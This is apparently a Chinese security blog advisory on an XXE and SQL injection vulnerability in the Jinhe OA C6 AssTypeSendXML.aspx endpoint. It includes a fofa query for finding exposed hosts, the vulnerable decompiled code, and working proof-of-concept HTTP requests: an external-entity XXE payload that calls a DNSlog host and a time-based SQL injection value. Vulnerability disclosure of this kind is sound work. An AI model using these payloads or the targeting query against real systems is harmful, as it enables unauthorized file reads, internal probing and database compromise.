---
title: "金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AssTypeSendXML-xxe-sqli.html
asset_dir: assets/金和oa-asstypesendxml.aspx-xxe+sql注入漏洞
---

# 金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/25 13:31
- 471浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

技术文章订阅

Docker加速服务

计算机安全

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AssTypeSendXML.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

Nessus

安全

网络安全会议

直接根据 `AssTypeSendXML.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Ask.dll` 将其进行反编译后找到 **AssTypeSendXML** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  XmlDataDocument xmlDataDocument = new XmlDataDocument();
  ((XmlDocument) xmlDataDocument).Load(this.Request.InputStream);
```

请求内容直接使 `xmlDataDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

[![金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞](images/img-001-ca656df33c06.webp)](https://image.mrxn.net/d228a3b40ee440d7aaa705dd0ddb2175.webp)

**对应 XML 输入满足以下条件即可：**

代码安全审计

- 第一节点（索引0）值为上述任意条件的字符串（如 "1"、"2"、"3"、"6"、"7"、"8"、"9"、"10"）。
- 节点数量不足，导致无法为 `str2` 赋值（即节点数小于3或4，具体见上面逻辑）。

# 漏洞复现

深入探索

漏洞预警服务

SQL注入检测工具

安全工具开发

## XXE

```
POST /c6/Jhsoft.Web.Asset/AssTypeSendXML.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

漏洞修复方案

[![金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞](images/img-002-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.Asset/AssTypeSendXML.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
  <type>2</type><assetTypeID>1001'SQLI_POC</assetTypeID>
</root>
```

[![金和OA AssTypeSendXML.aspx XXE+SQL注入漏洞](images/img-003-72fe101cae8f.webp)](https://image.mrxn.net/a4f01c852a8445beaee0cba414d30f43.webp)

成功延时 2 秒

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL](#toc-5-2-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALYklEQVR4AeycgXLjNgxE/fr//9xmBS8JQpSs+JzYnWPmcAssFiBNiLGT6/Sf2+3277P278mXe1pSY/HmKipXzZoj3nlh1ZzF0l+12ifXOZe5Z3wN5Ktu/fmUE2gD+Zrw7arVzQM3oNLTGNi0wDT/ShJoawHT1vU1Z9FRDtj65nyuk59zj3zpbW0gJha+9wR2A4GYPuzxaKt+Ao7y4q2ZofLZ4HhtiFzW23fvGldeeYg+MKK1Qun+1GDsDz2e9d4NZCZa3O+dwI8NRE+YzC8F4slwLITgpMum3FWb1UH0hcBZL9c55xiiBjpaUxEea2rNo/jHBvJo4ZWfn8BLBwL9iYHw58vOWRhr/NRmdCWEFvZojRH2GgiuahwLva58GYw14l5tLx3Iqzf3N/b7mYH8jSf5ote8G4iv6QyP1oTrVxlCC+za1TWzANh+GDNXtTmumhpLa84orppzxprPsTUVs6b6Vat4NxCRy953Am0gEE8gPMaj7eYn4BkNxNquhYiB9msd54zQNea+g94zRJ9cCyMH8xjIZZsPbDcaHuNWcP+rDeQeL3jzCfzjJ+QZrHuH/jTUnGPYayC4qsl7glFjbdaYM0LUWGNeaA5GDUQMSDaYawayBNY8i+uGlAN9d/hwIMDD74V+Gs5ezExj7gjP+sHxvlznvo4zQtRnTr5rhIplEFoYURqbdDIYNeKODEKb8w8HksXL//kT+AfGKUHEEDjbQn0qrDEvNHeGMF8D9rx6Zpv1db7mIPpBxyNN5t2vojVw3M811l7F/9MNufqa/te6NZAPG1/72Atx/a5cNZhrIXjoP8hB56DzXkcIofHZiJNB8NCxahxnVK3MnHyZ4+8ixPq1Tj1tNecYohYwdYrrhpwez+8nd2/q3sJs8uaMwPCR2LUZrTUHvcZcRQhN5msf58wLIepgxJlWelnNQa89ypmH61rVQOjly7S+DIIHbuuG3D7rq72HHG1LE7RBnyT094NZLYzameY7HIz9IOLcw/s05xj2WmuMEBrXCCE4CLR2hhAaCLRGfao5Z8z5dUN8Kh+C7T3EU4KYMOzRGuOV12CtcVbjHMSa1pjPWHOOM1oPYz+IGDrmuke++850Z7mZXhzEPuTb1g3xSXwIroF8yCC8jTYQiOvjq2e0UAihgRGVk7kmo3gZRM2VnPRH5nrnIfoCphpWreOMTXx3gPZRPuvk3yXTf72EqPuOxtqMbSCZXP77TqANRE+ADMZJ560pn805cxC1sEdrv4PQ+7gOgnPstYXmIDQQOOPNGVVfDY7roX/sV537GCFqoaN0MmuM0DVtIE4ufO8JtIFATEkTlMEYZw7GHIyxtH5Z8rNBaKGjtRVndeaqdhZbO8Oqh9hP5XPsPpmz75xxxsO4hrUZ20DcYOF7T+Dhr04gpgrj90xNFSLnlwARQ9fWnOpszjmGqDefsWogtLDHXHfkQ9S5r3UQPPTXAMFZY4TgAVPtE1ojThxg02fJuiH5ND7A3/3qxHvyk5PRORgnmzX2YdTUWuhPoHNG93AshHk/a4XSZYOxBiKG/dqqrwahN+/eNTaf8UwD0Tfr7a8b4pN4LT7dbQ3k6aP7mcLdmzocXydvoV5H2NdYA2POvBAiB4HiZBCx18uovCxz9sXLHFdUzlZzEGtCR2sguBq7l9A5+TIYa5QXPzMILbD+xfD2YV/tTR1iSnV/EDzs8UzrnJ8Ix9D7mDNC5GoM/U0YjjUw5ura7iuEudY1Qulk8mXyZfJlED1gj9LJoOcUz0y9bOs9ZHZCb+S+NRBPsaL3n3noTwZgyYDWm6yxeSEw/BBl7QylnxlED7h249wbos49YYzFW1tRORtEHYzovPBbA1HBsp89gcOBQExxtjzMcxA89CdwVm8OQu/Y6KfM8RlC9AB2MmC4VVkA85zXFmb9VR/mfa/WHw7kaoOle+0JrIG89jz/uNvuB0N31JWVOc4oXpY5+eJsMF5d89LZzBkhaiDQfEbXGs9y1kD0c5zR9eYgtICphsDht0CLaj/zQueM4qqtG1JP5M1x+8HQ+zibHsQTAiO69gwharIG9lzOn/kQtbBH1/m1nCFEvWsywpirfWZaiBoInGkyV/11Q+qJvDlu7yGePuwnW/dorXnHELVw7WOv6yHq3McIwQOW7tBaoZPyZcD2PR8CnRfCnhOvOptiWY1hX1s1jjOqlwz29eJl64boFD7I2kBgnBqMsfbsaUPkjmLxEBrVycQdmfIyiBoIFFet9oDQAk0KbDfDWicgeMDUKR7Vm88IDGtCxNDRi7nOccY2kEwu/30n8PBTlqcphJi2fNnZtpWXWQNR61gIwUn3yKSfWa6b5cVlTfWVl0HsBfaovMy1EBpx1SBy1uZ85Wos7bohOoUPsjcM5INe/QdupQ2kXh/HEFcQ+kdZ6BzQXhawvbFBR/cxNnFyoOuh+0nylAu9FzDt4X3N0AXA8Lqshc6bM0Lk3EMIwUGguGptIDWx4vecQBsIxNQg0NvxxIUzTrzN+Yww9oOIod+4s/rcK/vQ+0D4OS/ffY0QOugonQyCk39k7uO8YyFEPQTONJWDUat8G4iCZe8/gd2vTjRt2WxrEBOFOaqumvtA1DieoWudg6gBTLXv5SZck9E5oOkB0xtaD2yaGgOb7uwvYKuF49sOXeNeEJzjjOuG5NP4AP9wIBBThI5+iozev2PoWueM1mR07gizFqK3tc45nmHVOBZWPUR/5WxVcyWGsU+ucV9jztk/HIgFC3/3BNZAfve8H662+10WxJVzpa+X0ByMGvPS2CoHUQMdranoHtC15qoWQgO0lLXA9qbruAm+HIjcl7v9mWm2xNdfzsG8Rvkv2fZHvgxG7ZYsf0kng9AC6z+2vn3YV/uWBTElTSwbBA+0ree8/JaYOMD2lDolvc3cEVonrBoY+yoPI6c6mXJHprwMohY61hrpZJXPMUS9OeltEDkY0XlhG4gbLHzvCex+MLyyHRgn7BoYecCp6f8fpCXvDrDdJtjjXdL66Gk6MhjrXQudr9xRL/EQda4xQvDQUXrZTGNOeZnjjOuG5NP4AL8NBPqUofuzPWq62WaaykHvCXPfPWvtLIbokXMQnPsYs6b61kDU5jzsuZzP/lEf8xlznXyIdYD1Kev2YV/t55A8Qfln+4SYqDUQseoemWtmCNHHudzLHIwaiBiwpL0PNeLu5H72gU1/lzwNMO8DwUPHs0Xat6wz0cr93gmsgZye9e8n28feurSvdEZrzDk2wv5aQnDWuFY44zLvvBCO+6gmm/Qzg+gBHV030x/lIOpzjbUVs8Y+jPW5Zt0Qn9KHYHtTh5gaXMf6GvKkIfpYAxFDR+urxvEVhN7vit4arw1RX2MIHvq/BtZaxxkh6jJn32tUdF64bohO4YOsDaRO7Sw+2j/E0wEcSU55r2kRsH0khf1Tao1rhOaM0OsB01MEtrWmyTsJoYHAOz2A9iEbyAcBRD9g/WB4+7CvdkO8L+jTgtG35grqKck2q4GxP0Rsba6HMQcRwx5rfY3VF6JullNe5hyEVlw254UQGhhRORtEzrEx99wNxKKF7zmBNZD3nPvhqi8ZiK9cXgUeX8+sz/6snzmj9Y5nCLEH5yBi6B8SnHO/GVYNRB/zwlonrpo1EPWOM75kILnh8v/sBF46kPxEeFsQT4NzEDFgScOZBtg+jsKIrSg5MGrcL0maC6FtxN2B4IE7c2vr3+5fZ33vkgbAt+pfOpC2i+U8fQK7gXj6M/zOKq53DcSTYl7oXEXlqllj3nHGoxwcrw2Rcx/3mKE1EDXQseohcq65iruBXC1cup85gTYQiInCYzzaCvTaZzQQ9Ue1mfcTmTkY62EeA7nssg9s7wdeO2Nt4lzmZ5zyEH2B9auT24d9tRvyYfv6a7fzHwAAAP//svgNlwAAAAZJREFUAwBckaKkhuKwKQAAAABJRU5ErkJggg==)

手机扫码阅读
